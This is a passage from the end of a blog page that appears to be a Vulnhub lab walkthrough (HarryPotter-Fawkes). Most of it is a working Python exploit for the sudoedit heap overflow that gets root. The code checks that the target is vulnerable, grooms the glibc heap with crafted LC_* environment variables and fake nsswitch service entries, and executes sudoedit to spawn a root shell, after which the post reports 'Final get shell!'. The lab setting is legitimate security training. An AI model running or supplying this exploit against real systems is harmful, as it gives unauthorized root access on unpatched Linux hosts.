	<span class="token keyword">return</span> version<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">2</span> <span class="token keyword">and</span> version<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">26</span>

<span class="token keyword">def</span> <span class="token function">check_libc_tcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	libc<span class="token punctuation">.</span>malloc<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">(</span>c_int<span class="token punctuation">,</span><span class="token punctuation">)</span>
	libc<span class="token punctuation">.</span>malloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> c_void_p
	libc<span class="token punctuation">.</span>free<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">(</span>c_void_p<span class="token punctuation">,</span><span class="token punctuation">)</span>
	<span class="token comment"># small bin or tcache</span>
	size1<span class="token punctuation">,</span> size2 <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0xc0</span>
	mems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">32</span>
	<span class="token comment"># consume all size2 chunks</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>mems<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		mems<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> libc<span class="token punctuation">.</span>malloc<span class="token punctuation">(</span>size2<span class="token punctuation">)</span>

	mem1 <span class="token operator">=</span> libc<span class="token punctuation">.</span>malloc<span class="token punctuation">(</span>size1<span class="token punctuation">)</span>
	libc<span class="token punctuation">.</span>free<span class="token punctuation">(</span>mem1<span class="token punctuation">)</span>
	mem2 <span class="token operator">=</span> libc<span class="token punctuation">.</span>malloc<span class="token punctuation">(</span>size2<span class="token punctuation">)</span>
	libc<span class="token punctuation">.</span>free<span class="token punctuation">(</span>mem2<span class="token punctuation">)</span>
	<span class="token keyword">for</span> addr <span class="token keyword">in</span> mems<span class="token punctuation">:</span>
		libc<span class="token punctuation">.</span>free<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
	<span class="token keyword">return</span> mem1 <span class="token operator">!=</span> mem2

<span class="token keyword">def</span> <span class="token function">get_service_user_idx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token triple-quoted-string string">'''Parse /etc/nsswitch.conf to find a group entry index
	'''</span>
	idx <span class="token operator">=</span> <span class="token number">0</span>
	found <span class="token operator">=</span> <span class="token boolean">False</span>
	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/nsswitch.conf'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
		<span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>
			<span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">continue</span> <span class="token comment"># comment</span>
			line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">:</span>
				<span class="token keyword">continue</span> <span class="token comment"># empty line</span>
			words <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> words<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'group:'</span><span class="token punctuation">:</span>
				found <span class="token operator">=</span> <span class="token boolean">True</span>
				<span class="token keyword">break</span>
			<span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
				<span class="token keyword">if</span> word<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'['</span><span class="token punctuation">:</span>
					idx <span class="token operator">+=</span> <span class="token number">1</span>

	<span class="token keyword">assert</span> found<span class="token punctuation">,</span> <span class="token string">'"group" database is not found. might be exploitable but no test'</span>
	<span class="token keyword">return</span> idx

<span class="token keyword">def</span> <span class="token function">get_extra_chunk_count</span><span class="token punctuation">(</span>target_chunk_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment"># service_user are allocated by calling getpwuid()</span>
	<span class="token comment"># so we don't care allocation of chunk size 0x40 after getpwuid()</span>
	<span class="token comment"># there are many string that size can be varied</span>
	<span class="token comment"># here is the most common</span>
	chunk_cnt <span class="token operator">=</span> <span class="token number">0</span>

	<span class="token comment"># get_user_info() -> get_user_groups() -></span>
	gids <span class="token operator">=</span> os<span class="token punctuation">.</span>getgroups<span class="token punctuation">(</span><span class="token punctuation">)</span>
	malloc_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"groups="</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>gids<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">11</span>
	chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>malloc_size <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffff0</span>  <span class="token comment"># minimum size is 0x20. don't care here</span>
	<span class="token keyword">if</span> chunk_size <span class="token operator">==</span> target_chunk_size<span class="token punctuation">:</span> chunk_cnt <span class="token operator">+=</span> <span class="token number">1</span>

	<span class="token comment"># host=&lt;hostname>  (unlikely)</span>
	<span class="token comment"># get_user_info() -> sudo_gethostname()</span>
	<span class="token keyword">import</span> socket
	malloc_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"host="</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
	chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>malloc_size <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffff0</span>
	<span class="token keyword">if</span> chunk_size <span class="token operator">==</span> target_chunk_size<span class="token punctuation">:</span> chunk_cnt <span class="token operator">+=</span> <span class="token number">1</span>

	<span class="token comment"># simply parse "networks=" from "ip addr" command output</span>
	<span class="token comment"># another workaround is bruteforcing with number of 0x70</span>
	<span class="token comment"># policy_open() -> format_plugin_settings() -></span>
	<span class="token comment"># a value is created from "parse_args() -> get_net_ifs()" with very large buffer</span>
	<span class="token keyword">try</span><span class="token punctuation">:</span>
		<span class="token keyword">import</span> ipaddress
	<span class="token keyword">except</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> chunk_cnt
	cnt <span class="token operator">=</span> <span class="token number">0</span>
	malloc_size <span class="token operator">=</span> <span class="token number">0</span>
	proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> universal_newlines<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> line <span class="token keyword">in</span> proc<span class="token punctuation">.</span>stdout<span class="token punctuation">:</span>
		line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'inet'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">continue</span>
		<span class="token keyword">if</span> cnt <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment"># skip first 2 address (lo interface)</span>
			cnt <span class="token operator">+=</span> <span class="token number">1</span>
			<span class="token keyword">continue</span><span class="token punctuation">;</span>
		addr <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
		mask <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span>addr <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">else</span> addr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>netmask<span class="token punctuation">)</span>
		malloc_size <span class="token operator">+=</span> addr<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span>
		cnt <span class="token operator">+=</span> <span class="token number">1</span>
	malloc_size <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"network_addrs="</span><span class="token punctuation">)</span> <span class="token operator">+</span> cnt <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span>
	chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>malloc_size <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffff0</span>
	<span class="token keyword">if</span> chunk_size <span class="token operator">==</span> target_chunk_size<span class="token punctuation">:</span> chunk_cnt <span class="token operator">+=</span> <span class="token number">1</span>
	proc<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">return</span> chunk_cnt

<span class="token keyword">def</span> <span class="token function">execve</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">:</span>
	libc<span class="token punctuation">.</span>execve<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> c_char_p<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_char_p<span class="token punctuation">)</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_char_p<span class="token punctuation">)</span>

	cargv <span class="token operator">=</span> <span class="token punctuation">(</span>c_char_p <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
	cenvp <span class="token operator">=</span> <span class="token punctuation">(</span>c_char_p <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>envp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>

	libc<span class="token punctuation">.</span>execve<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> cargv<span class="token punctuation">,</span> cenvp<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">lc_env</span><span class="token punctuation">(</span>cat_id<span class="token punctuation">,</span> chunk_len<span class="token punctuation">)</span><span class="token punctuation">:</span>
	name <span class="token operator">=</span> <span class="token string">b"C.UTF-8@"</span>
	name <span class="token operator">=</span> name<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>chunk_len <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'Z'</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> LC_CATS<span class="token punctuation">[</span>cat_id<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">b"="</span><span class="token operator">+</span>name


<span class="token keyword">assert</span> check_is_vuln<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"target is patched"</span>
<span class="token keyword">assert</span> check_libc_version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26"</span>
<span class="token keyword">assert</span> check_libc_tcache<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"glibc tcache is not found"</span>
<span class="token keyword">assert</span> check_nscd_condition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"nscd service is running, exploit is impossible with this method"</span>
service_user_idx <span class="token operator">=</span> get_service_user_idx<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> service_user_idx <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'"group" db in nsswitch.conf is too far, idx: %d'</span> <span class="token operator">%</span> service_user_idx
create_libx<span class="token punctuation">(</span><span class="token string">"X/X1234"</span><span class="token punctuation">)</span>

<span class="token comment"># Note: actions[5] can be any value. library and known MUST be NULL</span>
FAKE_USER_SERVICE_PART <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">b"\\"</span> <span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token punctuation">[</span> <span class="token string">b"X/X1234\\"</span> <span class="token punctuation">]</span>

TARGET_OFFSET_START <span class="token operator">=</span> <span class="token number">0x780</span>
FAKE_USER_SERVICE <span class="token operator">=</span> FAKE_USER_SERVICE_PART<span class="token operator">*</span><span class="token number">30</span>
FAKE_USER_SERVICE<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> FAKE_USER_SERVICE<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># remove last '\\'. stop overwritten</span>

CHUNK_CMND_SIZE <span class="token operator">=</span> <span class="token number">0xf0</span>

<span class="token comment"># Allow custom extra_chunk_cnt incase unexpected allocation</span>
<span class="token comment"># Note: this step should be no need when CHUNK_CMND_SIZE is 0xf0</span>
extra_chunk_cnt <span class="token operator">=</span> get_extra_chunk_count<span class="token punctuation">(</span>CHUNK_CMND_SIZE<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

argv <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">b"sudoedit"</span><span class="token punctuation">,</span> <span class="token string">b"-A"</span><span class="token punctuation">,</span> <span class="token string">b"-s"</span><span class="token punctuation">,</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token punctuation">(</span>CHUNK_CMND_SIZE<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"\\"</span><span class="token punctuation">,</span> <span class="token boolean">None</span> <span class="token punctuation">]</span>
env <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">b"Z"</span><span class="token operator">*</span><span class="token punctuation">(</span>TARGET_OFFSET_START <span class="token operator">+</span> <span class="token number">0xf</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\\"</span> <span class="token punctuation">]</span> <span class="token operator">+</span> FAKE_USER_SERVICE
<span class="token comment"># first 2 chunks are fixed. chunk40 (target service_user) is overwritten from overflown cmnd (in get_cmnd)</span>
env<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span> lc_env<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b";A="</span><span class="token punctuation">,</span> lc_env<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> CHUNK_CMND_SIZE<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># add free chunks that created before target service_user</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> service_user_idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment"># skip LC_ALL (6)</span>
	env<span class="token punctuation">.</span>append<span class="token punctuation">(</span>lc_env<span class="token punctuation">(</span>i <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">6</span> <span class="token keyword">else</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> service_user_idx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
	env<span class="token punctuation">.</span>append<span class="token punctuation">(</span>lc_env<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># for filling hole</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token operator">-</span>extra_chunk_cnt<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	env<span class="token punctuation">.</span>append<span class="token punctuation">(</span>lc_env<span class="token punctuation">(</span>i<span class="token punctuation">,</span> CHUNK_CMND_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>

env<span class="token punctuation">.</span>append<span class="token punctuation">(</span>lc_env<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># for filling holes from freed file buffer</span>
env<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">b"TZ=:"</span><span class="token punctuation">)</span>  <span class="token comment"># shortcut tzset function</span>
<span class="token comment"># don't put "SUDO_ASKPASS" environment. sudo will fail without logging if no segfault</span>
env<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>

execve<span class="token punctuation">(</span>SUDO_PATH<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> env<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs-VmG0Pi0biU3XC1JC-Azj4AHgY.png"></p>
<p>Final get shell!<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoIGsn8QPQ2-pSaZVQCiIf_IH1uC.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Discovery"><span class="toc-number">1.</span> <span class="toc-text">Host Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-shell"><span class="toc-number">2.</span> <span class="toc-text">Get shell</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[14].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&text=Vulnhub HarryPotter-Fawkes"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&is_video=false&description=Vulnhub HarryPotter-Fawkes"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Vulnhub HarryPotter-Fawkes&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[14].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&name=Vulnhub HarryPotter-Fawkes&description=&lt;p&gt;Virtual Box address:&lt;br&gt;&lt;a href=&#34;https://download.vulnhub.com/harrypotter/Fawkes.ova&#34;&gt;https://download.vulnhub.com/harrypotter/Fawkes.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Difficulty: High&lt;br&gt;Target: 2 root privilege, 3 Flags&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[14].html&t=Vulnhub HarryPotter-Fawkes"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    l3vi4th4n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
